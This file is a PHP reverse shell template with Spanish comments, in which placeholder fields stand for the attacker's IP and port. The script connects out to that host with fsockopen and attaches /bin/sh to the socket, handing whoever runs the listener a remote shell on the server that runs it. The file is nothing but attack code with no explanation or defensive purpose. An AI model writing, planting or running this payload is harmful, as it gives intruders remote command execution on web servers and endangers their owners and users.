<?php
$host = "{}";  // IP del atacante
$port = "{}";     // Puerto del atacante

// Abrir una conexión de socket
$sock = fsockopen($host, $port);
if (!$sock) {
    exit("No se pudo conectar al host $host en el puerto $port\n");
}

// Redirigir entrada, salida y error a través del socket
$descriptorspec = array(
    0 => $sock,  // stdin
    1 => $sock,  // stdout
    2 => $sock   // stderr
);

// Ejecutar el shell
$proc = proc_open("/bin/sh", $descriptorspec, $pipes);
if (is_resource($proc)) {
    while ($f = fgets($pipes[0])) {
        fwrite($sock, $f);
    }
    fclose($sock);
}
?>
